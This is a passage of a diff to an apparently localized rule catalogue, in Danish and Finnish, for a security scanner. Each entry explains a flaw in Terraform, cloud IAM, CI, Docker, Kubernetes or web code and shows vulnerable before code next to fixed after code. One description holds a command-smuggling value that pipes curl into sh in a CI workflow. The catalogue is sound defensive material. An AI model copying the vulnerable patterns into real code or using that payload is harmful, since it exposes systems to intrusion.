+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "En Terraform security group åbner en følsom port mod hele internettet",
+    description:
+      "En regel med \"cidr_blocks\", der inkluderer 0.0.0.0/0 (enhver IP-adresse), er tæt på en følsom port — SSH (22), RDP (3389) eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # kun dit private netværk, eller en bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "En Google Cloud firewall-regel åbner en følsom port mod hele internettet",
+    description:
+      "En \"google_compute_firewall\"-ressource med \"source_ranges\", der inkluderer 0.0.0.0/0 (enhver IP-adresse), tillader trafik til en følsom port — SSH (22), RDP (3389) eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # kun dit private netværk, eller en bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "En Azure-netværksregel åbner en følsom port mod hele internettet",
+    description:
+      "En netværkssikkerhedsregel (\"azurerm_network_security_rule\", eller en \"security_rule\"-blok inde i \"azurerm_network_security_group\") med \"source_address_prefix\" sat til \"*\" eller \"0.0.0.0/0\", retning \"Inbound\" og adgang \"Allow\", tæt på en følsom port — SSH (22), RDP (3389) eller en typisk databaseport. Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # kun dit private netværk, eller en bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "En hemmelighed er skrevet som standardværdi for en Terraform-variabel",
+    description:
+      "En variabel med et navn som password/secret/token/key har en bogstavelig værdi i sin \"default\". I modsætning til en værdi, der sendes ved runtime (tfvars, TF_VAR_*-miljøvariabler), havner en default i kildekoden — og hvis repositoriet er delt eller offentligt, kan alle se den, selv uden adgang til Terraform-tilstanden.",
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # ingen default: send den med en .tfvars-fil (uden for git) eller en TF_VAR_db_password-miljøvariabel\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "En værdi kontrolleret af en ekstern bruger går direkte ind i en CI-shellkommando",
+    description:
+      'En "run:"-kommando i en GitHub Actions-workflow interpolerer direkte en værdi som en pull request-titel, et branch-navn eller teksten i en kommentar — alle sammen skrivbare af alle, der åbner en pull request eller kommentar, selv fra en ekstern fork. En værdi som `"; curl malware.sh | sh #` ville køre vilkårlige kommandoer i CI\'en, med adgang til alle hemmeligheder, der er tilgængelige i den workflow.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # sendt som en miljøvariabel, aldrig interpoleret direkte i kommandoen`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflowet kører koden fra en ekstern pull request med adgang til repositoriets hemmeligheder",
+    description:
+      'Workflowet bruger "pull_request_target" — som kører med basisrepositoriets tilladelser og hemmeligheder, selv for en pull request åbnet fra en ikke-relateret fork — og tjekker koden fra selve pull requesten ud ("github.event.pull_request.head"), ikke basisbranchen. Den, der åbner pull requesten, får reelt sin egen kode til at køre med adgang til de hemmeligheder.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Tjekker basisbranchen ud, ikke PR'ens kode — eller brug\n      # "pull_request" i stedet for "pull_request_target", hvis du ikke har brug for\n      # de bredere tilladelser/hemmeligheder.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Data fra anmodningen deserialiseres med et format, der kan eksekvere kode",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) eller node-serialize-biblioteket (Node) deserialiserer en værdi taget direkte fra anmodningen. I modsætning til JSON kan disse formater repræsentere og eksekvere kode under selve deserialiseringen — den, der kontrollerer den værdi, der sendes, kan opnå vilkårlig kodeeksekvering på serveren.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON eksekverer aldrig kode under parsing, i modsætning til pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Koden accepterer eksplicit usignerede JWT-tokens ("none"-algoritmen)',
+    description:
+      '"none" optræder blandt de algoritmer, der accepteres til at verificere et JWT-token. Et token med "none"-algoritmen har ingen signatur at verificere: alle kan bygge et med et hvilket som helst indhold (f.eks. en administratorrolle), og koden ville acceptere det som gyldigt.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkludér aldrig "none" blandt de accepterede algoritmer`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access er deaktiveret på en S3-bucket defineret i Terraform",
+    description:
+      'En eller flere af de fire beskyttelser i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) er sat til false. Det betyder ikke, at bucketten allerede er offentlig, men det fjerner et sikkerhedsnet, der ville forhindre, at den bliver gjort offentlig ved en fejl i fremtiden.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "En IAM-policy defineret i Terraform giver fuld adgang",
+    description:
+      'Et statement med handling "*" og ressource "*" giver fuld adgang til hver AWS-tjeneste og -ressource — samme kontrol, der allerede udføres på den live IAM-tilstand, her læst direkte fra koden, før den overhovedet er anvendt. Det kan være tiltænkt en nødrolle, men det bør bekræftes: til daglig brug skal du kun give de tilladelser, der rent faktisk er nødvendige.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "En Google Cloud Storage-bucket gøres læsbar for alle",
+    description:
+      'En "google_storage_bucket_iam_member"- eller "google_storage_bucket_iam_binding"-ressource giver en rolle til "allUsers" eller "allAuthenticatedUsers" — den første gør bucketten læsbar for alle på internettet, selv uden en Google-konto; den anden for alle med en hvilken som helst Google-konto, ikke kun dem, der burde have adgang.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # kun dem, der rent faktisk skal have adgang, ikke allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Offentlig blob-adgang er aktiveret på en Azure storage-konto",
+    description:
+      '"allow_blob_public_access" er sat til true på en "azurerm_storage_account": alle, der kender URL\'en til en blob/container gjort offentlig, kan læse den, uden nogen godkendelse.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "En Google Cloud IAM-rolle giver fuld adgang (Owner/Editor)",
+    description:
+      'En "google_project_iam_binding"/"google_project_iam_member" (eller det tilsvarende på organisations-/mappeniveau) tildeler den primitive rolle "roles/owner" eller "roles/editor" — næsten fuld adgang til hver tjeneste i projektet. Det kan være tiltænkt en nødkonto, men det bør bekræftes: til daglig brug skal du kun give de mere specifikke foruddefinerede roller, der rent faktisk er nødvendige.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # kun den foruddefinerede rolle, der rent faktisk er nødvendig, ikke roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "En Azure-roletildeling giver fuld adgang (Owner)",
+    description:
+      'En "azurerm_role_assignment" tildeler rollen "Owner" — fuld adgang, inklusive kontrol over andre brugeres tilladelser, over hele det tildelte scope (abonnement, ressourcegruppe...). Det kan være tiltænkt en nødkonto, men det bør bekræftes: til daglig brug skal du kun give den mere specifikke rolle, der rent faktisk er nødvendig (f.eks. "Contributor" på en enkelt ressourcegruppe).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # kun den mere specifikke rolle, der rent faktisk er nødvendig, ikke Owner på hele abonnementet\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Et sikkerhedstoken genereres med en talgenerator, der ikke er kryptografisk sikker",
+    description:
+      "En værdi med et navn som token/session/reset/otp/csrf genereres med Math.random() (JS), random.random() (Python) eller rand() (PHP) — generatorer, der ikke er designet til sikkerhed, og hvis sekvenser kan forudsiges. Et token genereret på denne måde kan gættes eller rekonstrueres, hvilket underminerer formålet med, at det eksisterer (f.eks. et link til nulstilling af adgangskode, som alle kunne forudsige).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ikke Math.random — uforudsigeligt`,
+    },
+  },
+  "ldap-injection": {
+    title: "Et LDAP-filter bygges ved direkte at sammenkæde en værdi fra anmodningen",
+    description:
+      'En linje, der bygger et LDAP-filter (f.eks. "(uid=...)"), inkluderer direkte en værdi taget fra anmodningen, uden nogen escaping af LDAP-specialtegn. Den, der kontrollerer den værdi, kan ændre filterets logik — for eksempel ved at omgå et godkendelsestjek eller læse directory-data, de ikke burde se.',
+    fix: {
+      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
+      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-specialtegn skal altid escapes, før de bruges i et filter\nclient.search(base, { filter });`,
+    },
+  },
+  "header-injection": {
+    title: "En værdi fra anmodningen havner direkte i en HTTP-svarheader",
+    description:
+      "En HTTP-svarheader sættes med en værdi taget direkte fra anmodningen (query, body, params), uden at kontrollere, at den ikke indeholder et linjeskift (CRLF). En angriber kan indsætte ekstra headers eller endda et helt andet svar — response splitting — og dermed potentielt manipulere caching, cookies eller indholdet vist til andre brugere.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "En tredjeparts CI-action er ikke låst til en præcis version (commit SHA)",
+    description:
+      'Workflowet bruger en tredjeparts action refereret via tag eller branch (f.eks. "@v1", "@main") i stedet for via commit SHA. Den, der vedligeholder den — eller den, der kompromitterer deres konto — kan flytte den reference til et andet commit når som helst, og dermed stille ændre, hvad der kører i CI\'en, med adgang til dens hemmeligheder. Et commit SHA peger altid på præcis den samme kode.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst til commit SHA'en — opdatér SHA'en, når du opdaterer versionen`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflowet giver sig selv alle token-tilladelser i stedet for kun dem, det bruger",
+    description:
+      '"permissions: write-all" giver workflowets GITHUB_TOKEN skriveadgang til alt — issues, pull requests, pakker, deployments — selv hvis workflowet kun bruger en del af det. Hvis et trin i workflowet bliver kompromitteret (en ondsindet afhængighed, et indsat script), øger de bredere tilladelser, hvad den, der udnytter det, kan gøre.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # kun de tilladelser, workflowet rent faktisk bruger`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "En session- eller godkendelsescookie er sat uden Secure- og HttpOnly-flagene",
+    description:
+      'En cookie med et navn, der minder om session/auth/token, er sat uden "httpOnly" og "secure" blandt dens indstillinger. Uden httpOnly kan JavaScript på siden — inklusive kode indsat via XSS — læse den cookie. Uden secure kan den også sendes over en ukrypteret HTTP-forbindelse.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Sårbar afhængighed:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Ingen rettet version kendt endnu — overvej en alternativ pakke eller følg projektets opdateringer."
+      ),
+    },
+  }),
+  "docker-hardcoded-secret": {
+    title: "En hemmelighed er skrevet direkte i en ENV- eller ARG-instruktion i Dockerfilen",
+    description:
+      "En variabel med et navn som password/secret/token/key har en bogstavelig værdi i en ENV- eller ARG-instruktion. I modsætning til en .env-fil (som normalt ikke havner i imaget), bliver denne værdi bagt ind i selve Docker-imaget — alle, der kan pulle det eller inspicere layer-historikken, kan hente den igen, selv hvis linjen fjernes i en senere version af Dockerfilen.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# sendt med: docker build --build-arg DB_PASSWORD=*** (eller, endnu bedre,\n# et BuildKit secret mount, som aldrig havner i layer-historikken)`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfilen sætter ikke en ikke-root-bruger",
+    description:
+      "Ingen USER-instruktion i Dockerfilen: uden den kører containeren som root. Hvis en angriber formår at køre kode inde i containeren (f.eks. ved at udnytte et sårbart bibliotek), gør root inde i containeren en eventuel flugt til hosten — eller en bredere konsekvens for det omkringliggende system — nemmere.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfilens basisimage bruger ":latest"-tagget',
+    description:
+      'En FROM-instruktion bruger eksplicit ":latest"-tagget i stedet for en præcis version. "latest" ændrer sig over tid: samme build, lavet igen på et andet tidspunkt, kan få en anden version af basisimaget — en ikke-reproducerbar build, og en uønsket opdatering kan ankomme, uden at nogen har besluttet, at den skulle.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfilen downloader en fjernfil med ADD i stedet for COPY",
+    description:
+      "En ADD-instruktion med en http/https-URL downloader en fil fra internettet under build'en, uden integritetstjek og uden at indholdet er synligt i repositoriet. Hvis den URL nogensinde bliver kompromitteret, trækker build'en vilkårligt indhold ind, uden at nogen bemærker det ved blot at læse Dockerfilen.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<forventet hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "En container i Kubernetes-manifestet kører som privileged",
+    description:
+      '"privileged: true" i en containers securityContext deaktiverer næsten al den normale isolation mellem container og host: containeren kan tilgå hostens enheder, ændre dens netværkskonfiguration og i mange tilfælde reelt opnå root-adgang til den maskine, der kører den. Næsten aldrig nødvendigt for en normal app.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # kun de capabilities, der rent faktisk er nødvendige`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "En hemmelighed er skrevet i klartekst i en env-variabel i Kubernetes-manifestet",
+    description:
+      'En miljøvariabel med et navn som password/secret/token/key har en bogstavelig værdi ("value:") i stedet for at blive læst fra en Secret ("valueFrom.secretKeyRef"). Selve manifestet — ofte committet til et repository — indeholder derfor hemmeligheden i klartekst, synlig selv for nogen, der kun kan læse konfigurationen, ikke nødvendigvis køre kommandoer i klyngen.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "En container i Kubernetes-manifestet er sat til at køre som root",
+    description:
+      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvinger eksplicit containeren til at køre som root. Hvis en angriber formår at køre kode inde i containeren (f.eks. ved at udnytte et sårbart bibliotek), gør root inde i containeren en eventuel flugt til hosten — eller en bredere konsekvens — nemmere.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "En container i Kubernetes-manifestet kan opnå flere rettigheder, end den startede med",
+    description:
+      '"allowPrivilegeEscalation: true" i securityContext lader en proces inde i containeren opnå flere rettigheder end den proces, der startede den (f.eks. via en binær med setuid-bit). Kombineret med en sårbarhed i applikationen er det et skridt nærmere eksekvering af kode med flere rettigheder end tiltænkt.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "En pod i Kubernetes-manifestet deler hostens netværk, processer eller delte hukommelse",
+    description:
+      '"hostNetwork", "hostPID" eller "hostIPC" sat til true tager podden ud af dens normale isolation: hostNetwork eksponerer podden på hostens netværk (og omgår klyngens netværkspolitikker), hostPID giver den indsigt i alle processer på hostmaskinen, hostIPC giver den adgang til hostens delte hukommelse. Næsten aldrig nødvendigt for en normal app — typisk kun til lavniveau system-/overvågningsværktøjer.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes-manifestet håndhæver ikke eksplicit kørsel som en ikke-root-bruger",
+    description:
+      'Intet "runAsNonRoot" nogen steder i manifestet (hverken på pod- eller containerniveau): uden at sætte det kører en container som den bruger, dens image definerer — ofte root som standard, hvis selve imaget ikke har ændret det. At sætte det eksplicit til true får podden til at fejle ved opstart, hvis imaget stadig prøver at køre som root, i stedet for først at opdage det efter en hændelse.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+},
+  fi: {
+  "supabase-service-role-in-client": {
+    title: "Supabasen salainen avain päätyy selaimelle tarkoitettuun tiedostoon",
+    description:
+      "Julkisella etuliitteellä varustettu muuttuja (esim. NEXT_PUBLIC_, VITE_) tai asiakaspuolen tiedosto viittaa Supabasen service role -avaimeen. Tämä avain ohittaa Row Level Securityn: jos se päätyy selaimen bundleen, kuka tahansa voi lukea sen ja toimia tietokannan pääkäyttäjänä.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (vain palvelin)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "Koodissa on suoraan kirjoitettuja salasanoja tai salaisia avaimia",
+    description:
+      "API-avain, token tai salasana näyttää olevan kirjoitettu suoraan literaaliarvona sen sijaan, että se luettaisiin ympäristömuuttujasta. Jokainen, joka lukee lähdekoodin (tai repositorion, jos se on julkinen), saa haltuunsa tämän salaisuuden.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "Analysoitujen tiedostojen joukossa on tiedosto, jossa on projektin oikeat salasanat",
+    description:
+      ".env-tiedosto oikeilla arvoilla (ei .env.example) on mukana analyysissä. Jos tämä tiedosto päätyy repositorioon tai julkiseen julkaisuun, kaikki sen sisältämät tunnukset paljastuvat.",
+    fix: {
+      before: `# .env (commitoitu vahingossa)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (commitoitu)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env pysyy repositorion ulkopuolella (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Kuka tahansa voi lukea tai muokata kaikkien käyttäjien tietoja",
+    description:
+      "Row Level Security on pois käytöstä, tai jokin policy sallii pääsyn kaikille (USING (true)) tarkistamatta, kuka pyynnön tekee. Jokainen kirjautunut käyttäjä — tai jopa anonyymi — voi lukea tai muokata kaikkien muiden tietoja.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "Käyttäjän syöttämä arvo liitetään suoraan tietokantakyselyyn",
+    description:
+      "SQL-kysely rakennetaan yhdistämällä tai interpoloimalla merkkijono suoraan sen sijaan, että käytettäisiin parametreja. Jos tämä teksti tulee (vaikka välillisesti) käyttäjältä, se voi muuttaa itse kyselyä — SQL-injektio.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Salasanat eivät näytä olevan suojattuja",
+    description:
+      "Salasanakenttä tallennetaan juuri sellaisena kuin se saapui pyynnössä, eikä tiedostossa näy yhtään hash-funktiota (bcrypt, argon2, scrypt). Jos tietokanta joutuu vaarantumaan, kaikki salasanat ovat heti käyttökelpoisia.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Kirjautumisten allekirjoittamiseen käytetty secret on kirjoitettu selväkielisenä koodiin",
+    description:
+      "jwt.sign / jwt.verify -funktiolle annettu secret (tai JWT_SECRET-muuttuja) on literaaliarvo koodissa sen sijaan, että se tulisi ympäristömuuttujasta. Jokainen, joka lukee sen, voi luoda kelvollisia pääsytunnuksia millä tahansa käyttäjällä.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Palvelin voidaan pakottaa suorittamaan ulkoisia komentoja",
+    description:
+      "Järjestelmäkomentoja suorittava funktio (exec, execSync, spawn) saa merkkijonon, joka on rakennettu interpoloimalla tai yhdistämällä. Jos osa tästä merkkijonosta tulee käyttäjän syötteestä, sen hallitsija voi suorittaa mielivaltaisia komentoja palvelimella.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "Palvelimen tiedosto voidaan lukea tai kirjoittaa valitsemalla polku ulkopuolelta",
+    description:
+      "Tiedostoa lukeva, kirjoittava tai lähettävä funktio saa polun suoraan pyynnön arvosta (query, body, params) tarkistamatta, että se pysyy sallitun kansion sisällä. Hyökkääjä voi lisätä \"../\" päästäkseen ulos aiotusta kansiosta ja lukeakseen tai korvatakseen mielivaltaisia tiedostoja palvelimella (esim. tunnuksia sisältävän asetustiedoston).",
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Polku ei ole sallittu")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "Käyttäjän syöttämä arvo suoritetaan koodina MongoDB-kyselyn sisällä",
+    description:
+      "MongoDBn $where-operaattori suorittaa palvelinpuolen JavaScriptiä jokaiselle dokumentille — jos tämä merkkijono rakennetaan yhdistämällä käyttäjältä tuleva arvo, sen hallitsija voi saada mielivaltaista koodia suoritettua tietokannan kontekstissa, ei vain muuttaa suodatinta kuten tavallisessa SQL-injektiossa.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "Käyttäjän syöttämä arvo tulkitaan templatena, ei datana",
+    description:
+      "Templaten kääntävä/suorittava funktio saa KOKO templaten pyynnön arvosta, sen sijaan että käytettäisiin kiinteää templatea ja välitettäisiin vain data. Hyökkääjä voi kirjoittaa suoraan template-moottorin syntaksilla (esim. {{7*7}} Jinja2:lle) ja suorittaa koodia palvelimella — Server-Side Template Injection, joka johtaa usein mielivaltaisten komentojen suorittamiseen, ei vain näyttöongelmaan kuten XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML-jäsennin voidaan pakottaa lukemaan tiedostoja tai tekemään ulkoisia pyyntöjä",
+    description:
+      "XML-jäsennin (DocumentBuilderFactory) luodaan poistamatta eksplisiittisesti käytöstä ulkoisia entiteettejä (DOCTYPE) lähellä olevilla riveillä. Jos jäsennin saa XML:ää epäluotettavasta lähteestä, hyökkääjä voi määritellä ulkoisen entiteetin lukeakseen tiedostoja palvelimelta tai saadakseen sen ottamaan yhteyttä valitsemaansa osoitteeseen — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Salaisuus on kirjoitettu suoraan Dockerfilen ENV- tai ARG-käskyyn",
+    description:
+      "Muuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo ENV- tai ARG-käskyssä. Toisin kuin .env-tiedosto (joka ei yleensä päädy imageen), tämä arvo leivotaan suoraan Docker-imageen — kuka tahansa, joka voi tehdä pullin tai tarkastella layerien historiaa, saa sen talteen, vaikka rivi poistettaisiin Dockerfilen myöhemmästä versiosta.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# välitetään komennolla: docker build --build-arg DB_PASSWORD=*** (tai vielä\n# parempi: BuildKitin secret mount, joka ei koskaan päädy layerien historiaan)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetes-manifestin kontti ajetaan privileged-tilassa",
+    description:
+      '"privileged: true" kontin securityContextissa poistaa käytöstä lähes kaiken tavanomaisen eristyksen kontin ja hostin välillä: kontti pääsee käsiksi hostin laitteisiin, voi muuttaa sen verkkoasetuksia ja saa monissa tapauksissa käytännössä root-oikeudet koneeseen, joka sitä suorittaa. Lähes koskaan tarpeen tavalliselle sovellukselle.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # vain oikeasti tarvittavat capabilityt`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
